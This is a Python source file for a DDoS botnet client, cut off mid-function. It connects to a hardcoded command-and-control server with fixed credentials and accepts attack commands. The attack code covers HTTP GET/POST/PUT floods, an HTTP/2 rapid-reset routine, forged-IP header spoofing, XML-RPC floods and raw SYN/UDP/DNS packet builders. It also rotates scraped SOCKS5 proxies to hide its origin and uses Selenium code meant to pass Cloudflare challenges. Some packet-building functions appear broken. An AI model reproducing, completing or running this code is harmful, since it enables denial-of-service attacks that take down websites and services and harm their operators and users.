from socket import socket , AF_INET , SOCK_STREAM , SOCK_DGRAM , SOCK_RAW , TCP_NODELAY , IPPROTO_TCP , IP_HDRINCL , IPPROTO_IP , IPPROTO_UDP , inet_aton
from time import sleep
from time import time
from threading import Thread as thr , Lock as lck
from urllib.parse import urlparse , urlunsplit
from random import choice as che
from random import randint as ran
from random import _urandom as byt
from certifi import where
from ssl import CERT_NONE , create_default_context , SSLContext , PROTOCOL_TLSv1_2
from fake_useragent import UserAgent
from string import ascii_letters , digits
from struct import pack
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.wait import WebDriverWait
from socks import socksocket , SOCKS5
from requests import get
from h2.connection import H2Connection
from base64 import b64encode
from re import compile as compilee
from random import choices
from sys import modules
from importlib.util import spec_from_file_location , module_from_spec
from signal import SIGTERM
from os import system , name , path , getpid , kill , getcwd

app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']

ipc2 = '198.50.160.231'
portc2 = 666

def strm(siz):
        return '%0x' % ran(0, 16 ** siz)

def spo_ip():
        addr = [192, 168, 0, 1]; d = '.'; addr[0] = str(ran(11, 197)); addr[1] = str(ran(0, 255)); addr[2] = str(ran(0, 255)); addr[3] = str(ran(2, 254)); ass = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]; return ass

def dns_gen(target):
        transaction_id = 0x1234
        flags = 0x0100
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0
        header = pack('>HHHHHH' , transaction_id , flags , questions, answer_rrs , authority_rrs , additional_rrs)
        qtype = 1
        qclass = 1
        domain_parts = target.split('.')
        qname = b''.join(pack('B', len(part)) + part.encode() for part in domain_parts) + b'\x00'
        question = qname + pack('>HH', qtype, qclass)
        dns_payload = header + question
        return dns_payload

def syn_gen(target  ,  port):
        ip_h = pack('!BBHHHBBH4s4s' , 69 , 0 , 20 , 54321 , 0 , 255 , IPPROTO_TCP , 0 , inet_aton(target) , inet_aton(target))
        tcp_h = pack('!HHLLBBHHH' , port , port , 0 , 0 , 18 , 0 , 8192 , 0 , 0)
        return ip_h + tcp_h

def gen_payl():
        size = ran(512 , 1024)
        payload = byt(size)
        payl = "b'"
        for i , b in enumerate(payload):
            payl += f"\\x{b:02x}"
            if (i + 1) % 16 == 0 and i != len(payload) - 1:
                payl += "'\nb'"
        payl += "'"
        return payload

def wait_for_load_event(driver , event , timeout , retries = 0):
        if retries == timeout:
            return Exception("timeout exceeded")
        try:
            sleep(1)
            state = driver.execute_script("return document.readyState")
            if state != "complete":
                wait_for_load_event(driver=driver , event=event , timeout=timeout , retries=retries + 1)
        except:
            wait_for_load_event(driver=driver , event=event , timeout=timeout , retries=retries + 1)

def wait_for_navigate(driver):
        wait_for_load_event(driver=driver , event="loading" , timeout=30)
        wait_for_load_event(driver=driver , event="complete " , timeout=30)

def wait_for_selector_visible(driver, selector, timeout):
        WebDriverWait(driver=driver, timeout=timeout, poll_frequency=1).until(
            lambda driver: driver.find_element("css selector" , selector).is_displayed()
        )

def random_string(length , characters):
    return ''.join(choices(characters , k=length))

def udp_raw_head(target , port):
    ip_ver_ihl = 69
    ip_tos = 0
    ip_tot_len = 0
    ip_id = 54321
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = IPPROTO_UDP
    ip_check = 0
    ip_saddr = inet_aton(target)
    ip_daddr = inet_aton(target)
    udp_length = 8
    udp_checksum = 0
    targetx = target
    portx = port
    header = pack('!BBHHHBBH4s4sHHHH' , ip_ver_ihl , ip_tos , ip_tot_len , ip_id , ip_frag_off , ip_ttl, ip_proto , ip_check , ip_saddr , ip_daddr , udp_length , udp_checksum , targetx , portx)
    return header

def game_udp(target , port):
    msg = "<==kedi-c2/botnet-on-top-mother-fucker==>"
    udp_length = 8 + len(msg)
    pseudo_header_checksum = 0
    udp_header = pack('!HHHH' , port , port , udp_length , pseudo_header_checksum)
    s = 0
    for i in range(0 , len(msg) , 2):
        w = (msg[i] << 8) + (msg[i+1])
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    s = ~s & 0xffff
    pseudo_header = pack('!4s4sBBH' , target , target , 0 , IPPROTO_UDP , len(msg))
    pseudo_packet = pseudo_header + msg.encode()
    udp_hdr_with_checksum = pack('!HHHH' , port , port , len(msg))
    head = pack('!HHHH' , port , port , udp_length , pseudo_header_checksum , pseudo_packet , udp_header , udp_hdr_with_checksum , pseudo_header , pseudo_packet)
    return head

def game_tcp(target  ,  port):
    ip_h = pack('!BBHHHBBH4s4s' , 69 , 0 , 20 , 54321 , 0 , 255 , SOCK_STREAM , 0 , inet_aton(target) , inet_aton(target))
    tcp_h = pack('!HHLLBBHHH' , port , port , 0 , 0 , 18 , 0 , 8192 , 0 , 0)
    return ip_h + tcp_h

def r6_gen(target , port):
    data = "pos_x:120,y:240,shoot"
    ip_ver_ihl = 69
    ip_tos = 0
    ip_tot_len = 0
    ip_id = 54321
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = SOCK_DGRAM
    ip_check = 0
    ip_saddr = inet_aton(target)
    ip_daddr = inet_aton(target)
    udp_length = 8
    udp_checksum = 0
    targetx = target
    portx = port
    header = pack('!BBHHHBBH4s4sHHHH' , ip_ver_ihl , ip_tos , ip_tot_len , ip_id , ip_frag_off , ip_ttl, ip_proto , ip_check , ip_saddr , ip_daddr , udp_length , udp_checksum , targetx , portx , data)
    return header

class tcpamp:
    def __init__(self , source_port , dest_port , seq_num , ack_num , data_offset , flags , window_size , checksum , urgent_pointer):
        self.source_port = source_port
        self.dest_port = dest_port
        self.seq_num = seq_num
        self.ack_num = ack_num
        self.data_offset = data_offset
        self.flags = flags
        self.window_size = window_size
        self.checksum = checksum
        self.urgent_pointer = urgent_pointer

    def pack(self):
        return pack('!HHLLBBHHH',
                        self.source_port ,
                        self.dest_port ,
                        self.seq_num ,
                        self.ack_num ,
                        (self.data_offset << 4) | self.flags ,
                        self.window_size ,
                        self.checksum ,
                        self.urgent_pointer)

class udpxd:
    def __init__(self, source_port, dest_port, length, checksum, data):
        self.source_port = source_port
        self.dest_port = dest_port
        self.length = length
        self.checksum = checksum
        self.data = data

    def pack(self):
        header = pack('!HHHH' , self.source_port , self.dest_port , self.length , self.checksum)
        return header + self.data

def tcp_paf_data(target , port):
    source_ip = f"{ran(1, 223)}.{ran(0, 255)}.{ran(0, 255)}.{ran(0, 255)}"
    source_port = ran(1024, 65535)
    seq = ran(0 , 4294967295)
    ack = 0
    flags = 0x18
    tcp_header = pack('!HHLLBBHHH' , source_port , port , seq , ack , 5 << 4 , flags , 65535 , 0 , 0)
    ip_header = pack('!BBHHHBBH4s4s' , 69 , 0 , 20 + len(tcp_header) , 54321 , 0 , 255 , 6 , 0 , inet_aton(source_ip) , inet_aton(target))
    return ip_header + tcp_header

def handshaketcp(port):
    seq = ran(0 , 65535)
    ack = 0
    offset_res = (5 << 4) + 0
    flags = 0x02
    window = socket.htons(5840)
    checksum = 0
    urgent_pointer = 0
    tcp_header = pack('!HHLLBBHHH' , port , port , seq ,ack , offset_res , flags , window , checksum , urgent_pointer)
    return tcp_header

def tcp_connhex(path , target , ua , cookie):
    payl = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nCookie: {cookie}\r\n\r\n"
    payl_bytes = payl.encode('utf-8')
    hex_payload = ''.join(f'\\x{b:02x}' for b in payl_bytes)
    return hex_payload


def get_cookies(driver):
    cookies = driver.get_cookies()
    pieces = []
    for cookie in cookies:
        cookie_string = cookie["name"] + "=" + cookie["value"]
        pieces.append(cookie_string)
    return ";".join(pieces)

def mine_hex(target , port):
    protocol_version = 763
    server_address = target.encode('utf-8')
    server_address_length = len(server_address)
    server_port = port
    next_state = 1 
    packet_id = 0x00
    packet = pack(
        f">B B {server_address_length}s H B",
        packet_id, 
        protocol_version,
        server_address_length, 
        server_address, 
        server_port, 
        next_state
    )
    return packet

def socks5geter():
    prapi1 = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"
    prapi2 = "https://raw.githubusercontent.com/zloi-user/hideip.me/refs/heads/master/https.txt"
    prapi3 = "https://www.proxy-list.download/api/v1/get?type=socks5"
    prapi4 = "https://raw.githubusercontent.com/zloi-user/hideip.me/refs/heads/main/socks5.txt"
    prapi5 = "https://raw.githubusercontent.com/zloi-user/hideip.me/refs/heads/main/connect.txt"
    prapi6 = "https://api.openproxylist.xyz/socks5.txt"
    prapi7 = "https://proxyspace.pro/socks5.txt"
    prapi8 = "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt"
    pf = open('theprxy.txt', 'w+')
    rq = (get(prapi1).text).split()
    for pyy in rq:
        pf.write(pyy + '\n')
    pf.close()
    pf = open('theprxy.txt' , 'a')
    rq = (get(prapi2).text).split()
    pf.write('\n')
    for pyy in rq:
        pf.write(pyy + '\n')
    pf.close()
    pf = open('theprxy.txt' , 'a')
    rq = (get(prapi3).text).split()
    pf.write('\n')
    for pyy in rq:
        pf.write(pyy + '\n')
    pf.close()
    pf = open('theprxy.txt' , 'a')
    rq = (get(prapi4).text).split()
    pf.write('\n')
    for pyy in rq:
        pf.write(pyy + '\n')
    pf.close()
    pf = open('theprxy.txt' , 'a')
    rq = (get(prapi5).text).split()
    pf.write('\n')
    for pyy in rq:
        pf.write(pyy + '\n')
    pf.close()
    pf = open('theprxy.txt' , 'a')
    rq = (get(prapi6).text).split()
    pf.write('\n')
    for pyy in rq:
        pf.write(pyy + '\n')
    pf.close()
    pf = open('theprxy.txt' , 'a')
    rq = (get(prapi7).text).split()
    pf.write('\n')
    for pyy in rq:
        pf.write(pyy + '\n')
    pf.close()
    pf = open('theprxy.txt' , 'a')
    rq = (get(prapi8).text).split()
    pf.write('\n')
    for pyy in rq:
        pf.write(pyy + '\n')
    pf.close()
    
def iroxy():
    prapixd = "https://fineproxy.org/wp-admin/admin-ajax.php?action=proxylister_download&nonce=5b8e140742&format=txt&filter={}"
    pf = open('ir.txt' , 'w+')
    rq = (get(prapixd).text).split()
    for pyy in rq:
        pf.write(pyy + '\n')
    pf.close()

def main():
    while True:
        s = None
        connected = False
        while not connected:
            try:
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((ipc2, portc2))
                print("VPN connected.")
                connected = True
            except Exception as e:
                print(f"Connection failed: {e}. Retrying in 5 seconds...")
                if s:
                    try:
                        s.close()
                    except:
                        pass
                sleep(5)
        try:
            while True:
                data = s.recv(1024)
                if not data:
                    print("Disconnected from server.")
                    break
                if b"Username" in data:
                    s.send("kediam".encode())
                elif b"Password" in data:
                    s.send("FSOCIETY".encode())
                else:
                    try:
                        c2 = data.decode().strip()
                        if c2.split()[0] == '!att':
                            method = str(c2.split()[1])
                            url = str(c2.split()[2])
                            port = int(c2.split()[3])
                            threads = int(c2.split()[4])
                            rpc = int(c2.split()[5])
                            timme = int(c2.split()[6])
                            timer = time() + timme
                        elif c2.split()[0] == '!proxy':
                            thr(target=socks5geter).start()
                        elif c2.split()[0] == '!proxyir':
                            thr(target=iroxy).start()
                    except:
                        pass
                try:
                    us = UserAgent()
                    ua = us.random
                    ctx = create_default_context(cafile=where())
                    ctx.check_hostname = False
                    ctx.verify_mode = CERT_NONE
                    parsed_url = urlparse(url)
                    target = parsed_url.netloc
                    path = parsed_url.path
                    if path == "":
                        path = "/"
                    def generate_fake_phpsessid(length):
                        characters = ascii_letters + digits
                        fake_phpsessid = ''.join(che(characters) for _ in range(length))
                        return fake_phpsessid
                    fake_cookie_phpsessid = generate_fake_phpsessid(147)
                    fake_cookie_phpsessidd = generate_fake_phpsessid(32)
                    response = get(url)
                    cookie = response.cookies
                    if cookie == '':
                        cookie = ("cf_clearance="+fake_cookie_phpsessid, "PHPSSID="+fake_cookie_phpsessidd)
                except:
                    pass

                    def raw():
                        while time() < timer:
                            try:
                                if url.split('://')[0] == 'https':
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s = ctx.wrap_socket(s, server_hostname=target)
                                    s.connect((target,port))
                                else:
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s.connect((target,port))
                                for _ in range(rpc):
                                    payl = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n".encode()
                                    s.send(payl)
                            except:
                                pass
                            
                    def get():
                        while time() < timer:
                            try:
                                if url.split('://')[0] == 'https':
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s = ctx.wrap_socket(s, server_hostname=target)
                                    s.connect((target,port))
                                else:
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s.connect((target,port))
                                for _ in range(rpc):
                                    payl = f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nDNT: 1\r\nReferer: {che(reff)}\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()
                                    s.send(payl)
                            except:
                                pass

                    def rapid():
                        while time() < timer:
                            try:
                                if url.split('://')[0] == 'https':
                                    sok5 = open('theprxy.txt' , 'r').read().split()
                                    s = socksocket()
                                    s = socket.create_connection(target , port)
                                    pri = che(sok5).split(':');
                                    s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
                                    s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
                                    encrypted_data = b64encode("GET {TARGET} HTTP/2".encode()).decode()
                                    conn = H2Connection()
                                    conn.initiate_connection()
                                    s = ctx.wrap_socket(s , server_hostname=target)
                                    s.connect((target , port))
                                else:
                                    sok5 = open('theprxy.txt' , 'r').read().split()
                                    s = socksocket()
                                    pri = che(sok5).split(':');
                                    s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
                                    s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
                                    encrypted_data = b64encode("GET {TARGET} HTTP/2".encode()).decode()
                                    conn = H2Connection()
                                    conn.initiate_connection()
                                    s.connect((target , port))
                                for _ in range(rpc):
                                    iur = "https" if url.split('://')[0] == "https" else "http"
                                    payl = {
                                        ":method": "GET",
                                        ":path": path,
                                        ":scheme": iur,
                                        ":authority": target,
                                        "user-agent": ua,
                                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                        "accept-encoding": "gzip, deflate, br",
                                        "connection": "keep-alive",
                                        "encrypted-data": encrypted_data
                                    }
                                    stream_id = conn.get_next_available_stream_id()
                                    conn.send_headers(stream_id , payl)
                                    s.send(conn.data_to_send())
                                    conn.reset_stream(stream_id)
                                    s.send(conn.data_to_send())
                                    while True:
                                        data = s.sock.recv(65535)
                                        if not data:
                                            break
                                        events = conn.receive_data(data)
                                        has_sent = False
                                        for event in events:
                                            if hasattr(event, 'stream_id'):
                                                if event.stream_id == stream_id:
                                                    conn.reset_stream(event.stream_id)
                                                    conn.send(conn.data_to_send())
                                                    has_sent = True
                                                    break
                                    if has_sent:
                                        return (1 , "")
                                    else:
                                        available_id = conn.get_next_available_stream_id()
                                        if available_id == 0:
                                            conn.reset_stream(1)
                                            s.send(conn.data_to_send())
                                        else:
                                            conn.reset_stream(available_id)
                                            s.send(conn.data_to_send())
                                            return (1, "")
                            except:
                                pass 

                    def spoof():
                        while time() < timer:
                            try:
                                if url.split('://')[0] == 'https':
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s = ctx.wrap_socket(s, server_hostname=target)
                                    s.connect((target,port))
                                else:
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s.connect((target,port))
                                for _ in range(rpc):
                                    ipt = spo_ip()
                                    payl = f'GET {path}?{strm(6)}={strm(6)}={strm(6)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nX-Originating-IP: {ipt}\r\nX-Forwarded-For: {ipt}\r\nX-Forwarded: {ipt}\r\nForwarded-For: {ipt}\r\nX-Forwarded-Host: {ipt}\r\nX-Remote-IP: {ipt}\r\nX-Remote-Addr: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nX-Original-URL: {ipt}\r\nClient-IP: {ipt}\r\nX-Client-IP: {ipt}\r\nTrue-Client-IP: {ipt}\r\nX-Host: {ipt}\r\nCluster-Client-IP: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nVia: 1.0 fred, 1.1 {ipt}\r\n\r\n'.encode()
                                    s.send(payl)
                            except:
                                pass

                    def post():
                        while time() < timer:
                            try:
                                if url.split('://')[0] == 'https':
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s = ctx.wrap_socket(s, server_hostname=target)
                                    s.connect((target,port))
                                else:
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s.connect((target,port))
                                for _ in range(rpc):
                                    payl = f'POST {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nReferer: {che(reff)}\r\nContent-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n\r\n'.encode()
                                    s.send(payl)
                            except:
                                pass

                    def bypass():
                        while time() < timer:
                            try:
                                if url.split('://')[0] == 'https':
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s = ctx.wrap_socket(s, server_hostname=target)
                                    s.connect((target,port))
                                else:
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s.connect((target,port))
                                for _ in range(rpc):
                                    pathr = (
        "?" + random_string(1, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789") + "=" +
        random_string(8, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789") +
        random_string(1, "|=") +
        random_string(8, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
    )
                                    payl = f'GET {pathr} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Cotrol: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()
                                    s.send(payl)
                            except:
                                pass

                    def browser():
                        chrome_options = Options()
                        user_agent = UserAgent()
                        options = Options()
                        options.add_argument("--disable-features=Translate,OptimizationHints,MediaRouter")
                        options.add_argument("--disable-extensions")
                        options.add_argument("--disable-component-extensions-with-background-pages")
                        options.add_argument("--disable-background-networking")
                        options.add_argument("--disable-component-update")
                        options.add_argument("--disable-client-side-phishing-detection")
                        options.add_argument("--disable-sync")
                        options.add_argument("--metrics-recording-only")
                        options.add_argument("--disable-default-apps")
                        options.add_argument("--mute-audio")
                        options.add_argument("--no-default-browser-check")
                        options.add_argument("--no-first-run")
                        options.add_argument("--disable-backgrounding-occluded-windows")
                        options.add_argument("--disable-renderer-backgrounding")
                        options.add_argument("--disable-background-timer-throttling")
                        options.add_argument("--disable-ipc-flooding-protection")
                        options.add_argument("--password-store=basic")
                        options.add_argument("--use-mock-keychain")
                        options.add_argument("--force-fieldtrials=*BackgroundTracing/default/")
                        options.add_argument("--allow-pre-commit-input")
                        options.add_argument("--disable-breakpad")
                        options.add_argument("--disable-dev-shm-usage")
                        options.add_argument("--disable-hang-monitor")
                        options.add_argument("--disable-popup-blocking")
                        options.add_argument("--disable-prompt-on-repost")
                        options.add_argument("--disable-search-engine-choice-screen")
                        options.add_argument("--enable-blink-features=IdleDetection")
                        options.add_argument("--enable-features=NetworkServiceInProcess2")
                        options.add_argument("--export-tagged-pdf")
                        options.add_argument("--force-color-profile=srgb")
                        options.add_argument("--disable-features=Translate,AcceptCHFrame,MediaRouter,OptimizationHints")
                        options.add_argument("--test-type")
                        options.add_argument("--renderer-process-limit=1")
                        options.add_argument("--in-process-gpu")
                        options.add_argument("--disable-gpu")
                        options.add_argument("--disable-setuid-sandbox")
                        options.add_argument("--no-zygote")
                        options.add_argument("--no-sandbox")
                        options.add_argument("--headless=new")
                        options.add_argument("--user-agent=" + user_agent)
                        service = Service()
                        driver = webdriver.Chrome(service=service , options=chrome_options)
                        driver.get(url)
                        sleep(5)
                        try:
                            captcha_element = driver.find_element(By.ID , "captcha")
                            captcha_element.click()
                            driver.execute_script(f"window.open('{url}', '_blank');")
                            sleep(30)
                            driver.switch_to.window(
                                window_name=driver.window_handles[0]
                            )
                            driver.close()
                            driver.switch_to.window(
                                window_name=driver.window_handles[0]
                            )
                            source = driver.page_source
                            if "access denied" in driver.title.lower():
                                driver.quit()
                            if "challenge-platform" in source:
                                CLOUDFLARE_CAPTCHA_SELECTOR = "iframe[src*='challenges']"
                                CLOUDFLARE_CHECKBOX_SELECTOR = "input[type='checkbox']"
                                wait_for_selector_visible(driver=driver, selector=CLOUDFLARE_CAPTCHA_SELECTOR, timeout=30)
                                captcha_box = driver.find_element("css selector", CLOUDFLARE_CAPTCHA_SELECTOR)
                                driver.switch_to.frame(captcha_box)
                                sleep(12)
                                captcha_checkbox = driver.find_element("css selector", CLOUDFLARE_CHECKBOX_SELECTOR)
                                actions = ActionChains(driver=driver)
                                actions.click(captcha_checkbox)
                                actions.perform()
                                driver.switch_to.default_content()
                                wait_for_navigate(driver=driver)
                                sleep(12)
                        except:
                            pass
                        sleep(9)
                        driver.quit()
                        return driver
                    
                    def put():
                        while time() < timer:
                            try:
                                if url.split('://')[0] == 'https':
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s = ctx.wrap_socket(s, server_hostname=target)
                                    s.connect((target,port))
                                else:
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s.connect((target,port))
                                for _ in range(rpc):
                                    payl = f"PUT {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n".encode()
                                    s.send(payl)
                            except:
                                pass

                    def http_mix():
                        while True:
                            try:
                                if url.split('://') == 'https':
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s = ctx.wrap_socket(s , server_hostname=target)
                                    s.connect((target , port))
                                else:
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s.connect((target , port))
                                for _ in range(rpc):
                                    payl1 = f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: {url}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode()
                                    payl2 = f'POST {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nReferer: {url}\r\nContent-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n\r\n'.encode()
                                    payl3 = f'HEAD {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n'.encode()
                                    payl4 = f"PUT {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n".encode()
                                    s.sendall(payl1 , payl2 , payl3 , payl4)
                                    s.send(payl2)
                                    s.send(payl3)
                                    s.send(payl4)
                            except:
                                pass

                    def http():
                        while time() < timer:
                            try:
                                s = socket(AF_INET , SOCK_STREAM)
                                s.connect((target,port))
                                for _ in range(rpc):
                                    payl = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n".encode()
                                    s.send(payl)
                            except:
                                pass

                    def xmlrpc():
                        while time() < timer:
                            try:
                                if url.split('://')[0] == 'https':
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s = ctx.wrap_socket(s , server_hostname=target)
                                    s.connect((target , port))
                                else:
                                    s = socket(AF_INET , SOCK_STREAM)
                                    s.connect((target , port))
                                for _ in range(rpc):
                                    payl = f'POST {path} HTTP/1.1\r\nHost: {target}\r\nContent-Length: 131\r\n<?xml version="1.0" encoding="utf-8"?>\r\n<methodCall>\r\n<methodName>system.listMethods</methodName>\r\n<params></params>\r\n</methodCall>\r\n\r\n'.encode()
                                    s.send(payl)
                            except:
                                pass

                    def https():
                        while time() < timer:
                            try:
                                if url.split('://')[0] == 'https':
                                    sok5 = open('theprxy.txt' , 'r').read().split()
                                    s = socksocket()
                                    s = socket.create_connection(target , port)
                                    pri = che(sok5).split(':');
                                    s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
                                    s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
                                    encrypted_data = b64encode("GET {TARGET} HTTP/2".encode()).decode()
                                    conn = H2Connection()
                                    conn.initiate_connection()
                                    s = ctx.wrap_socket(s , server_hostname=target)
                                    s.connect((target , port))
                                else:
                                    sok5 = open('theprxy.txt' , 'r').read().split()
                                    s = socksocket()
                                    pri = che(sok5).split(':');
                                    s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
                                    s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
                                    encrypted_data = b64encode("GET {TARGET} HTTP/2".encode()).decode()
                                    conn = H2Connection()
                                    conn.initiate_connection()
                                    s.connect((target , port))
                                for _ in range(rpc):
                                    iur = "https" if url.split('://')[0] == "https" else "http"
                                    payl = {
                                        ":method": "GET",
                                        ":path": path,
                                        ":scheme": iur,
                                        ":authority": target,
                                        "user-agent": ua,
                                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                        "accept-encoding": "gzip, deflate, br",
                                        "connection": "keep-alive",
                                        "encrypted-data": encrypted_data
                                    }
                                    conn.send_headers(1  , payl)
                                    s.sendall(conn.data_to_send())
                            except:
                                pass

                    def spoof_storm():
                        while time() < timer:
                            try:
                                if url.split('://')[0] == 'https':
                                    sok5 = open('theprxy.txt' , 'r').read().split()
                                    s = socksocket()
                                    pri = che(sok5).split(':');
                                    s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
                                    s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
                                    s = ctx.wrap_socket(s , server_hostname=target)
                                    s.connect((target , port))
                                else:
                                    sok5 = open('theprxy.txt' , 'r').read().split()
                                    s = socksocket()
                                    pri = che(sok5).split(':');
